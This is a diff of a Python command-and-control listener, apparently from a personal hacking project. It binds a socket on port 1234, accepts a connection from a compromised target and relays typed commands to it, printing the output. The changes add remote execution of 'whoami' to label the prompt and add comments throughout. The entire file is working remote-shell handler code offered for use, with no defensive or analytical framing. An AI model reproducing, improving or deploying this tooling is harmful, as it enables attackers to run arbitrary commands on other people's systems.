@@ -1,14 +1,18 @@
 #!/usr/bin/python3
 
 import socket
-from termcolor import colored
+from termcolor import colored # coloring library
 import time
 
+# Getting a shell
 def shell():
 	
 	while True:
-		cmd = input(f"{ip}~> ")
-		trgt.send(cmd.encode('utf-8'))
+
+		get_username() # getting username of trgt shell
+
+		cmd = input(f"{username}@{ip}~> ") # trgt shell prompt
+		trgt.send(cmd.encode('utf-8')) # encoding to binary before sending via socket
 
 		if cmd == 'exit':
 			print(colored("\n[-] Closing connection...", 'yellow'))
@@ -16,10 +20,10 @@ def shell():
 			print(colored("[-] Connection Closed\n", 'red'))
 			break
 		else:
-			result = trgt.recv(10024)
-			print(result.decode('utf-8'))
+			result = trgt.recv(102400) # received response in binary form 
+			print(result.decode('utf-8')) # decoding to text form
 
-
+# C2 server function
 def server():
 
 	global ip
@@ -29,21 +33,10 @@ def server():
 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-	'''
-	parser = argparse.ArgumentParser()
+	ip = "0.0.0.0" # listening on any ip, change it (if you wish to)
+	port = 1234 # chnage it (if you wish to)
 
-	parser.add_argument("ip", help="specify Target ip")
-	parser.add_argument("port", help="specify Target port")
-
-	args = parser.parse_args()
-
-	ip = args.ip
-	port = args.port
-	'''
-	ip = "0.0.0.0"
-	port = 1234
-
-	sock.bind((ip, port))
+	sock.bind((ip, port)) # binding ip and port to form a method
 	sock.listen(5)
 
 	print(colored('''
@@ -51,15 +44,29 @@ def server():
 
 
 	trgt, ip = sock.accept()
-	print(colored(f"[+] Connections Established From: {ip}", 'green'))
+	print(colored(f"[+] Connections Established From: {ip}\n", 'green'))
 
-def func():
+
+def get_username():
+
+	global username
+
+	username = "whoami" # to know the username of the trgt
+	trgt.send(username.encode('utf-8')) # encoding to binary before sending via socket
+
+
+	username = trgt.recv(102400) # received response in binary form
+	username = username.decode('utf-8') # decoding to text form
+	
+	username = username.strip() # Stripping out EOL spacing
+
+
+def main():
 	server()
 	shell()
-	sock.close()
+	sock.close() # Closing listening socket as soon as 'exit' command is used in terminal by C2 server owner to break out of shell() function
 
 
 if __name__ == '__main__': 
-
-	func()
+	main()
 
